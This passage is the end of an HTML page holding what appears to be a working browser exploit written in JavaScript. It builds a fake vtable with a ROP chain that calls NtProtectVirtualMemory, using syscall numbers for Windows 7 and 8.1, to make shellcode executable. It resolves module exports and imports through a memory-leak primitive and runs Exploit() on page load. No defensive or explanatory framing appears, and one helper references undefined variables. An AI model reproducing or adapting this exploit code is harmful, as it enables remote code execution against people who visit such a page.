	if(WindowsVersion == 8.1) {
		FakeVtable += ConvertDwordArrayToBytes([0x4F]); // Windows 8.1 NtProtectVirtualMemory SYSCALL #
		//FakeVtable += ConvertDwordArrayToBytes([NtProtectAddress + 0x15]); // 0x15 is offset to next export skipping over MOV EAX, #
	}
	else {
		FakeVtable += ConvertDwordArrayToBytes([0x4D]); // Windows 7 SP0/SP1 NtProtectVirtualMemory SYSCALL #
		//FakeVtable += ConvertDwordArrayToBytes([NtProtectAddress + 29]); // 29 (0x1D) is offset to next export skipping over MOV EAX, #
	}
    
	FakeVtable += ConvertDwordArrayToBytes([NtProtectAddress]);
    FakeVtable += ConvertDwordArrayToBytes([RopGadgetSet.RopNop]); // Return address
    FakeVtable += ConvertDwordArrayToBytes([0xFFFFFFFF]);
    FakeVtable += ConvertDwordArrayToBytes([WritableAddress + 0x4]);
    FakeVtable += ConvertDwordArrayToBytes([WritableAddress + 0x8]);
    FakeVtable += ConvertDwordArrayToBytes([0x40]); // +RX (PAGE_EXECUTE_READ) causes problems due to the page alignment used by NtProtectVirtualMemory. The shellcode is unlikely to begin on a clean multiple of 0x1000, and similarly won't probably end on one either (although this attribute can be manipulated with padding). +RW data on the heap surrounding the shellcode may end up +RX and this causes crashes.
    FakeVtable += ConvertDwordArrayToBytes([WritableAddress + 0xC]);
    FakeVtable += ConvertDwordArrayToBytes([ShellcodeAddress]);
    //FakeVtable += ConvertDwordArrayToBytes([RopGadgetSet.StackPivot]);
	FakeVtable += ConvertDwordArrayToBytes([0x11111111]); // Shellcode will return to this pseudo-address
    
	// Padding on the end of the vtable is not needed: both NtProtectVirtualMemory and the shellcode will be using memory below this address
    
    return FakeVtable;
}

function NullSanitizeDword(StrDword) {
    var Sanitized = 0;
    
    if(StrDword != 0) {
        if((StrDword & 0x000000FF) == 0) {
            Sanitized = 0; // Regardless of whether or not the rest of the DWORD has non-null bytes, it starts with one. So it is empty.
        }
        else if((StrDword & 0x0000FF00) == 0) {
            Sanitized = (StrDword & 0x000000FF);
        }
        else if((StrDword & 0x00FF0000) == 0) {
            Sanitized = (StrDword & 0x0000FFFF);
        }
        else if((StrDword & 0xFF000000) == 0) {
            Sanitized = (StrDword & 0x00FFFFFF);
        }
		else {
			Sanitized = StrDword; // No null bytes, preserve it all
		}
    }
    
    return Sanitized;
}

function NullSanitizeWord(StrWord) {
    var Sanitized = 0;
    
    if(StrWord != 0) {
        if((StrWord & 0x00FF) == 0) {
            Sanitized = 0; // First byte is NULL, end of the string.
        }
        else if((StrWord & 0xFF00) == 0) {
            Sanitized = StrWord; // First byte non-NULL followed by NULL: end of string with no need for sanitization
        }
    }
    
    return Sanitized;
}

function ResolveExport(ModuleBase, TargetExportNameTable) {
    var FileHdr = LeakDword(ModuleBase + 0x3c);
    var ExportDataDir = ModuleBase + FileHdr + 0x78; // Import data directory
	
	if(ExportDataDir) {
		var EATRva = LeakDword(ExportDataDir);

		var TotalExports = LeakDword(ModuleBase + EATRva + 0x14);
		var AddressRvas = LeakDword(ModuleBase + EATRva + 0x1C);
		var NameRvas = LeakDword(ModuleBase + EATRva + 0x20);
		var OrdinalRvas = LeakDword(ModuleBase + EATRva + 0x24);
		
		// Binary search because linear search is too slow
		var MaxIndex = TotalExports; // Largest number in search space
		var MinIndex = 0; // Smallest number in search space
		var CurrentIndex = Math.floor(TotalExports/2);
		var TargetTableIndex = 0;
		var BinRes = 0;
		
		while(TotalExports) { 
			var CurrentNameRva = LeakDword(ModuleBase + NameRvas + 4*CurrentIndex);

			while (TargetTableIndex < TargetExportNameTable.length) {
				CurrentNameDword = LeakDword(ModuleBase + (CurrentNameRva + (4 * TargetTableIndex)));
				var SanitizedCurrentNameDword = NullSanitizeDword(CurrentNameDword);
				BinRes = BinaryCmp(TargetExportNameTable[TargetTableIndex], SanitizedCurrentNameDword);

				if(!BinRes) {
					//DebugLog("matched " + SanitizedCurrentNameDword.toString(16) + " to " + TargetExportNameTable[TargetTableIndex].toString(16) + " result " + BinRes.toString(10) + " table index is " + TargetTableIndex.toString(10) + " export index is " + CurrentIndex.toString(10));
				
					if((TargetTableIndex + 1) >= TargetExportNameTable.length) {
						Ordinal = LeakWord(ModuleBase + OrdinalRvas + 2*CurrentIndex);
						MainExport = (ModuleBase + LeakDword(ModuleBase + AddressRvas + 4*Ordinal));
						return [ MainExport , CurrentIndex];
					}
					else {
						//DebugLog("Chunks are equal but not at final index, current is: " + TargetTableIndex.toString(10));
					}
					
					TargetTableIndex++;
				}
				else {
					TargetTableIndex = 0;
					break;
				}
			}
			
			if(BinRes == 1) { // Target is greater than what it was compared to: reduce current index
				if(MaxIndex == CurrentIndex) {
					DebugLog("Failed to find export: index hit max");
					break;
				}
				
				MaxIndex = CurrentIndex;
				CurrentIndex = Math.floor((CurrentIndex + MinIndex) / 2);
			} 
			else if (BinRes == -1) { // Target is less than what it was compared to: enhance current index
				if(MinIndex == CurrentIndex) {
					DebugLog("Failed to find export: index hit min");
					break;
				}
				
				MinIndex = CurrentIndex;
				CurrentIndex = Math.floor((CurrentIndex + MaxIndex) / 2);
			}
			
			if(CurrentIndex == MaxIndex && CurrentIndex == MinIndex) {
				DebugLog("Failed to find export: current, min and max indexes are all equal");
				break;
			}
		}
	}
	
	return [0,0];
}


function BinaryCmp(TargetNum, CmpNum) { // return -1 for TargetNum being greater, 0 for equal, 1 for CmpNum being greater
    if(TargetNum == CmpNum) {
        return 0;
    }
    
    while(true) {
        if((TargetNum & 0xff) > (CmpNum & 0xff)) {
            return -1;
        }
		else if((TargetNum & 0xff) < (CmpNum & 0xff)) {
            return 1;
        }
		
        TargetNum = TargetNum >> 8;
        CmpNum = CmpNum >> 8;
    }
}

function DwordToUnicode(Dword) {
    var Unicode = String.fromCharCode(Dword & 0xFFFF);
    Unicode += String.fromCharCode(Dword >> 16);
    return Unicode;
}

function TableToUnicode(Table) {
    var Unicode = "";
    
    for (i = 0; i < Table.length; i++) {
        Unicode += DwordToUnicode(Table[i]);
    }

    return Unicode;
}

function ConvertDwordArrayToBytes(DwordArray) {
    var ByteArray = [];
    
    for (i = 0; i < DwordArray.length; i++) {
        ByteArray.push(DwordArray[i] & 0xffff);
        ByteArray.push((DwordArray[i] & 0xffff0000) >> 16);
    }
    
    return String.fromCharCode.apply(null, ByteArray);
}

////////
// Compare two strings between an array of WORDs and a string at a memory address

function StrcmpLeak(StrWordTable, LeakAddress) {
	var TargetTableIndex = 0;
	
	while (TargetTableIndex < StrWordTable.length) {
		LeakStrWord = LeakWord(ModuleBase + (CurrentNameRva + (4 * TargetTableIndex)));
		var SanitizedStrWord = NullSanitizeWord(LeakStrWord);
		if(StrWordTable[TargetTableIndex] == SanitizedStrWord) {
			//DebugLog("matched " + SanitizedCurrentNameDword.toString(16) + " to " + StrWordTable[TargetTableIndex].toString(16) + " result " + BinRes.toString(10) + " table index is " + TargetTableIndex.toString(10) + " export index is " + CurrentIndex.toString(10));
		
			if((TargetTableIndex + 1) >= StrWordTable.length) {
				return true;
			}
			else {
				//DebugLog("Chunks are equal but not at final index, current is: " + TargetTableIndex.toString(10));
			}
			
			TargetTableIndex++;
		}
		else {
			break;
		}
	}
	
	return false;
}

function ResolveImport(ModuleBase, HintIndex, TargetModuleNameLow, TargetModuleNameHigh, TargetFuncName1, TargetFuncName2, TargetFuncName3) {
    var ExtractedAddresss = 0;
    var FileHdr = LeakDword(ModuleBase + 0x3c);
    var ImportDataDir = ModuleBase + FileHdr + 0x80; // Import data directory
    var ImportRva = LeakDword(ImportDataDir);
    var ImportSize = LeakDword(ImportDataDir + 0x4); // Get the size field of the import data dir
    var CurrentNameDesc = ModuleBase + ImportRva;
    
    while(ImportSize != 0) {
        NameField = LeakDword(CurrentNameDesc + 0xc); // 0xc is the offset to the module name pointer
        
        if(NameField != 0) {
            CurrentModuleNameLow = LeakDword(ModuleBase + NameField);
			
			if(CurrentModuleNameLow == TargetModuleNameLow) {
				CurrentModuleNameHigh = LeakDword(ModuleBase + NameField + 4);
				
				if(CurrentModuleNameHigh == TargetModuleNameHigh) {
					// Found the target module by name. Walk its INT to check each name.
					var CurrentIATIndex = HintIndex;
					var INTThunkRva = (LeakDword(CurrentNameDesc + 0x0) + (HintIndex * 4));
					var IATThunkRva = (LeakDword(CurrentNameDesc + 0x10) + (HintIndex * 4));
					
					//DebugLog("Found target module in IAT by name. IAT RVA " + IATThunkRva.toString(16) + " INT RVA " + INTThunkRva.toString(16));
					
					if(INTThunkRva == 0) {
						alert("INT is empty in target module");
					}
					
					while(true) {
						var INTThunkValue = LeakDword(ModuleBase + INTThunkRva);
						
						if(INTThunkValue == 0) {
							break;
						}
						
						DebugLog("Index " + CurrentIATIndex.toString(10) + " calculating import name address from INT thunk value of " + INTThunkValue.toString(16));
						
						if((INTThunkValue & 0x80000000) == 0) { // Only parse non-orginal INT entries
							//
							var ImportNameAddress = (ModuleBase + INTThunkValue + 2); // The INT thunk is an RVA pointing at a IMAGE_IMPORT_BY_NAME struct. Skip the hint field in this struct to point directly to the ASCII import name.
							//DebugLog("Calculated import name address of " + ImportNameAddress.toString(16));
							// Always read the first 4 bytes of the name. If atleast one chunk has matched, and there have been no mismatches (unless the target chunk was given as 0) consider the import found.
							
							var ImportName1 = LeakDword(ImportNameAddress);
							
							if(TargetFuncName1 == ImportName1) {
								if(TargetFuncName2 != 0) {
									var ImportName2 = LeakDword(ImportNameAddress + 4);
									
									if(ImportName2 == TargetFuncName2) {
										if(TargetFuncName3 != 0) {
											var ImportName3 = LeakDword(ImportNameAddress + 8);
									
											if(ImportName3 == TargetFuncName3) {
												ExtractedAddresss = LeakDword(ModuleBase + IATThunkRva);
												break;
											}
										}
										else {
											ExtractedAddresss = LeakDword(ModuleBase + IATThunkRva);
											break;
										}
									}
								}
								else {
									ExtractedAddresss = LeakDword(ModuleBase + IATThunkRva);
									break;
								}
							}
						}
						
						CurrentIATIndex++;
						IATThunkRva += 4;
						INTThunkRva += 4;
					}
					
					if(ExtractedAddresss != 0) {
						DebugLog("Identified target import at IAT index " + CurrentIATIndex.toString(10));
						break;
					}
				}
			}
            
            ImportSize -= 0x14;
            CurrentNameDesc += 0x14; // Next import descriptor in array
        }
        else {
            break;
        }
    }
    
    return ExtractedAddresss;
}

function ExtractBaseFromImports(ModuleBase, TargetModuleNameLow, TargetModuleNameHigh) { // Grab the first IAT entry of a function within the specified module (determined via the first 8 bytes of its name string)
    var ExtractedAddresss = 0;
    var FileHdr = LeakDword(ModuleBase + 0x3c);
    var ImportDataDir = ModuleBase + FileHdr + 0x80; // Import data directory
    var ImportRva = LeakDword(ImportDataDir);
    var ImportSize = LeakDword(ImportDataDir + 0x4); // Get the size field of the import data dir
    var CurrentNameDesc = ModuleBase + ImportRva;
    
    while(ImportSize != 0) {
        NameField = LeakDword(CurrentNameDesc + 0xc); // 0xc is the offset to the module name pointer
        
        if(NameField != 0) {
            CurrentModuleNameLow = LeakDword(ModuleBase + NameField);
			
			if(CurrentModuleNameLow == TargetModuleNameLow) {
				CurrentModuleNameHigh = LeakDword(ModuleBase + NameField + 4);
				
				if(CurrentModuleNameHigh == TargetModuleNameHigh) {
					ThunkAddress = LeakDword(CurrentNameDesc + 0x10);
					ExtractedAddresss = LeakDword(ModuleBase + ThunkAddress + 8); // +8 since __imp___C_specific_handler can cause issues when imported in some jscript instances
					break;
				}
			}
            
            ImportSize -= 0x14;
            CurrentNameDesc += 0x14; // Next import descriptor in array
        }
        else {
            break;
        }
    }
    
    return ExtractedAddresss;
}

Exploit();

</script>
</head>
</html>